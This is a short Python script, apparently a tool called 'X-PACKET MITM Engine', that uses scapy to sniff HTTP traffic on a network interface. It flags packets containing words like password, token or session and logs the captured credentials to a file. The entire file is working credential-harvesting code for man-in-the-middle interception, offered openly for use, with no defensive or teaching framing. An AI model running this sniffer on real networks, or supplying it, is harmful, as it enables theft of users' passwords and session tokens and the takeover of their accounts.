import scapy.all as scapy
from scapy.layers import http
import sys
import os

def check_privileges():
    if os.getuid() != 0:
        sys.exit("[!] ERROR: MITM Extraction requires ROOT privileges.")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Extracting the Target URL
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"\n[🌐] HTTP Request: {url}")

        # High-Value Data Extraction (Usernames, Passwords, Tokens)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            keywords = ["username", "user", "password", "pass", "login", "email", "token", "session"]
            for keyword in keywords:
                if keyword in load.lower():
                    print(f"\n[🔥] POTENTIAL CREDENTIALS FOUND: \n{load}\n")
                    # Log to X-PACKET Mission Database
                    with open("intercepted_creds.log", "a") as f:
                        f.write(f"URL: {url}\nDATA: {load}\n---\n")
                    break

def launch_sniffer(interface):
    check_privileges()
    print(f"[*] X🌍PACKET™ MITM Engine Active on {interface}...")
    print("[*] Monitoring for Plaintext Credentials (HTTP/FTP/SMTP)...")
    try:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    except KeyboardInterrupt:
        print("\n[!] MITM Engine Shutdown. Logs secured in intercepted_creds.log")

if __name__ == "__main__":
    if len(sys.argv) == 2:
        launch_sniffer(sys.argv[1])
    else:
        print("Usage: sudo python3 mitm_extractor.py <Interface> (e.g., eth0, wlan0)")
